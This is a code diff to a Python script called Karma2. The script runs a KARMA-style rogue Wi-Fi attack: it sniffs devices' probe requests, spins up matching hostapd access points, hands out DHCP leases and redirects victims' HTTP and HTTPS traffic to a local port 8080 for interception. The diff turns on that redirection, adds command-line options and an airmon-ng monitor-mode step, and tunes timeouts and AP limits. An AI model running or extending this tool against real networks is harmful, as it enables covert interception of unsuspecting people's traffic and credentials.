@@ -5,10 +5,35 @@ import time,random,re,tempfile
 import subprocess
 from scapy.all import *
 from select import select
+import argparse
+
+
+DEFAULT = '\033[49m\033[39m'
+RED = '\033[91m'
+BRED = '\033[101m'
+DRED = '\033[107m\033[41m'
+BLUE = '\033[94m'
+DBLUE = '\033[107m\033[44m'
+GREEN = '\033[92m'
+DGREEN = '\033[107m\033[42m'
+YELLOW = '\033[93m'
+
+def _ctxt(txt,color):
+  return ''.join((color,txt,DEFAULT))
+
+
+def parse_args():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-g", "--gateway", help="Choose the router IP address. Example: -g 192.168.0.1")
+    parser.add_argument("-m", "--monitor", help="Choose the monitor interface")
+    parser.add_argument("-e", "--enable", help="Choose the monitor interface to enable")
+    parser.add_argument("-a", "--hostapd", help="shoose the hostapd interface")
+    return parser.parse_args()
+
 
 class Karma2:
 
-  FORBIDDEN_APS = ('ottersHQ',)
+  FORBIDDEN_APS = ('ottersHQ','forYourOttersOnly')
 
   class AccessPoint(Thread):
     def __init__(self, karma, essid):
@@ -18,12 +43,12 @@ class Karma2:
 
       self.activity_ts = time.time()
 
-      iface,self.airbase_process = self.create_airbase_access_point(essid)
+      iface,self.airbase_process = self.create_hostapd_access_point(essid)
       subnet = self.karma.get_unique_subnet()
       self.setup_iface(iface,subnet)
       # redirect the following ports
-      #self.setup_redirections(iface,80,8080)
-      #self.setup_redirections(iface,443,8080)
+      self.setup_redirections(iface,80,8080)
+      self.setup_redirections(iface,443,8080)
       #self.setup_redirections(iface,443,8080)
       self.dhcpd_process = self.start_dhcpd(iface,subnet)
 
@@ -32,7 +57,7 @@ class Karma2:
       while True:
 
         # check timeout
-        if nclients == 0 and time.time() - self.activity_ts > 60.0:
+        if nclients == 0 and time.time() - self.activity_ts > 30.0:
           print "[x] No activity for essid",self.essid,"destroying AP"
           self.dhcpd_process.kill()
           self.dhcpd_process.wait()
@@ -53,9 +78,14 @@ class Karma2:
             r".*DHCPACK\(\w+\) ([0-9\.]+) ([a-zA-Z0-9:]+) ([\w-]+).*",line)
           if m is not None:
             ip,mac,name = m.groups()
-            print "DHCPACK from %s (%s)"%(ip,name)
-
+            print "DHCPACK from %s (%s)"%(_ctxt(ip, GREEN),name)
             nclients += 1
+          m = re.match(
+            r".*([a-zA-Z0-9:]+)*disassociated due to inactivity*",line)
+          if m is not None:
+            mac = m.groups()
+            print "dissociated %s"%mac
+            nclients -= 1
 
         if airfd in rlist:
           line = self.airbase_process.stdout.readline()
@@ -110,15 +140,15 @@ class Karma2:
       p.wait()
 
     def create_hostapd_access_point(self, essid):
-      print "[+] Creating (hostapd) AP %s"%essid
+      print "[+] Creating (hostapd) AP %s"%_ctxt(essid,GREEN)
 
-      interface = '???'
+      interface = self.ifhostapd
       channel = 4
 
       f = tempfile.NamedTemporaryFile(delete=False)
-      f.write("ssid=%s"%(essid))
-      f.write("interface=%s"%(interface))
-      f.write("channel=%s"%(channel))
+      f.write("ssid=%s\n"%(essid))
+      f.write("interface=%s\n"%(interface))
+      f.write("channel=%s\n"%(channel))
       f.close()
 
       cmd = ["hostapd",f.name]
@@ -141,9 +171,10 @@ class Karma2:
           iface, = m.groups()
           return iface,p
 
-  def __init__(self, ifgw, ifmon):
+  def __init__(self, ifgw, ifmon, ifhostapd = None):
     self.ifmon = ifmon
     self.ifgw = ifgw
+    self.ifhostapd = ifhostapd
     self.aps = {}
     self.subnets = set(xrange(50,256)) 
     self.clear_iptables()
@@ -192,7 +223,7 @@ class Karma2:
         if section.ID == 0 and section.info != '':
           
           # limit concurrent APs
-          if len(self.aps) > 9:
+          if len(self.aps) > 0:
             return
 
           if (not section.info in self.aps.keys()
@@ -204,11 +235,12 @@ class Karma2:
 
 if __name__ == '__main__':
 
-  # network interface connect to the outside world
-  GATEWAY_INTERFACE='wlan0'
-  # 802.11 monitor interface created using airmon-zc 
-  MONITOR_INTERFACE='wlan2mon'
-  km = Karma2(GATEWAY_INTERFACE, MONITOR_INTERFACE)
+  args = parse_args()
+  if args.enable is not None:
+    cmd = "airmon-ng start %s"%args.enable
+    subprocess.Popen(cmd)
+    
+  km = Karma2(args.gateway, args.monitor, args.hostapd)
 
   #km.create_ap('NSA Honeypot')
   km.do_sniff()
